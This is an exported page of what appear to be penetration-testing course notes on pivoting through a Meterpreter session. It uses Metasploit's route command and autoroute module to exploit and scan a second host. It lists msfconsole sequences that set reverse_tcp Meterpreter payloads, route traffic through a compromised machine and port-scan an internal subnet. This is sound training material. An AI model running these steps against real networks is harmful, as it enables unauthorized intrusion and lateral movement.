<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Pivoting an Exploit trhough an existing meterpreter session</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Pivoting an Exploit trhough an existing meterpreter session</h1><br/><strong>Requirements:</strong><br />• Meterpreter session between attacker and pivot host<br /><br /><strong><h2>Pivoting an Exploit using Metasploit route command and a Meterpreter session</h2></strong><br />Metasploit <strong>route</strong> command, for pivoting attacks through already-established Meterpreter sessions.<br />When we have already exploited the Victim1 machine and we want to run an exploit for the Victim2 machine, we&#39;ll be pivoting our attack through Victim1<br /><br /><a href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/pivotExploitMeterpreter.png"><img src="images/769-1.png" alt="images/769-1.png" /></a><br /><br /><strong><h3>Metasploit route command</h3></strong>(OPTION 1)<br />network command of metasploit<br /><div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;use&nbsp;[exploit1]<br />msf&nbsp;&gt;&nbsp;set&nbsp;RHOST&nbsp;[victim1]<br />msf&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp<br />msf&nbsp;&gt;&nbsp;exploit<br />meterpreter&nbsp;&gt;&nbsp;(CTRL-Z&nbsp;to&nbsp;background&nbsp;session…&nbsp;will&nbsp;display&nbsp;meterpreter&nbsp;sid)<br />msf&nbsp;&gt;&nbsp;route&nbsp;add&nbsp;[victim2_network]&nbsp;[netmask]&nbsp;[sid]<br />msf&nbsp;&gt;&nbsp;route&nbsp;print&nbsp;&nbsp;&nbsp;#to&nbsp;check&nbsp;if&nbsp;the&nbsp;route&nbsp;is&nbsp;been&nbsp;added;&nbsp;route&nbsp;-h&nbsp;give&nbsp;use&nbsp;other&nbsp;options<br />msf&nbsp;&gt;&nbsp;use&nbsp;[exploit2]<br />msf&nbsp;&gt;&nbsp;set&nbsp;RHOST&nbsp;[victim2]<br />msf&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp<br />msf&nbsp;&gt;&nbsp;exploit</div></div><br /><br /><strong>explanation of </strong><strong><code>route add [victim2_network] [netmask] [sid]  command</code></strong><br />   ◇ <strong><code>[victim2_network]</code></strong><strong> </strong>→  is the network where is victim2<br />   ◇ <code>netmask</code> → is a 32-bit &quot;mask&quot; used to define the subnet in the network (example: 255.255.225.0)<code><br /></code>   ◇ <code>sid</code> → meterpreter session running (in this case the sid is of the victim1 machine)<br />With this command we tell metasploit to route all the traffic intended to the network <code>victim2_network</code>/<code>netmask</code>, through the meterpreter session <code>sid</code>. <br />In other words, all the traffic to <code>victim2_network</code>/<code>netmask</code> will be tunneled through Victim 1<strong><br /><br /><br /></strong><strong><h3>Metasploit autoroute module</h3></strong><h3>(OPTION 2)</h3><br />use autoroute script from the meterpreter session<br /><br />• Pivot the entire traffic for a network<br />    <div class="codebox"><div class="codebox">meterpreter&gt;&nbsp;run&nbsp;autoroute&nbsp;-s&nbsp;10.32.121.0/24<br />meterpreter&gt;&nbsp;background<br />msf&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.32.121.23&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#all&nbsp;the&nbsp;traffic&nbsp;will&nbsp;be&nbsp;routed&nbsp;through&nbsp;autoroute<br />msf&gt;&nbsp;&gt;&nbsp;use&nbsp;auxiliary/scanner/portscan/tcp</div></div><br /><br /><br />• Pivot an exploit<br />    <div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;use&nbsp;[exploit1]<br />msf&nbsp;&gt;&nbsp;set&nbsp;RHOST&nbsp;[victim1]<br />msf&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;[AttackerIP]<br />msf&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp<br />msf&nbsp;&gt;&nbsp;exploit<br />meterpreter&gt;&nbsp;background<br /></div></div><br />    <div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;use&nbsp;post/multi/manage/autoroute<br />msf&nbsp;&gt;&nbsp;info<br />msf&nbsp;&gt;&nbsp;set&nbsp;CMD&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#If&nbsp;we&nbsp;use&nbsp;the&nbsp;default&nbsp;CMD&nbsp;option:&nbsp;autoadd&nbsp;,&nbsp;our&nbsp;other&nbsp;options&nbsp;will&nbsp;be&nbsp;ignored;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#autoadd&nbsp;search&nbsp;the&nbsp;routing&nbsp;table&nbsp;in&nbsp;the&nbsp;victim1&nbsp;machine&nbsp;and&nbsp;add&nbsp;the&nbsp;routes&nbsp;found<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#in&nbsp;the&nbsp;Metasploit&#39;s&nbsp;routing&nbsp;table<br />msf&nbsp;&gt;&nbsp;set&nbsp;SUBNET&nbsp;[victim2_network]<br />msf&nbsp;&gt;&nbsp;set&nbsp;NETMASK&nbsp;/24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#we&nbsp;can&nbsp;use&nbsp;both&nbsp;the&nbsp;notation&nbsp;&quot;255.255.255.0&quot;&nbsp;or&nbsp;&quot;/24&quot;<br />msf&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;[sid]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#meterpreter&nbsp;session&nbsp;that&nbsp;we&nbsp;got&nbsp;with&nbsp;the&nbsp;exploit&nbsp;1<br />msf&nbsp;&gt;&nbsp;run<br />meterpreter&nbsp;&gt;&nbsp;autoroute&nbsp;-p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;check&nbsp;if&nbsp;the&nbsp;route&nbsp;is&nbsp;been&nbsp;added<br />meterpreter&nbsp;&gt;&nbsp;background&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#or&nbsp;CTRL-Z&nbsp;to&nbsp;background&nbsp;session…&nbsp;will&nbsp;display&nbsp;meterpreter&nbsp;sid<br />msf&nbsp;&gt;&nbsp;route&nbsp;print&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;check&nbsp;if&nbsp;the&nbsp;route&nbsp;is&nbsp;been&nbsp;added<br />msf&nbsp;&gt;&nbsp;use&nbsp;[exploit2]<br />msf&nbsp;&gt;&nbsp;set&nbsp;RHOST&nbsp;[victim2]<br />msf&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp<br />msf&nbsp;&gt;&nbsp;exploit</div></div><br /><br />Now we can use modules to scan ports of the victim2 machine:<br />    <a href=""><img src="images/769-2.png" alt="images/769-2.png" /></a><br /><br /><br /><span style="color:#ff1b00;">WARNING:</span><br />We do not have to confuse:<br />• Metasploit (msf) route command: used to direct all traffic for a given target subnet from the attacker&#39;s Metasploit machine through a given Meterpreter session on a compromised victim machine to another potential victim<br />• Meterpreter(meterpreter) route command: used to manage the routing tables on a target box that has been compromised using the Meterpreter payload<br /><br />Bibliography:<br /><br /></div>
</body>
</html>
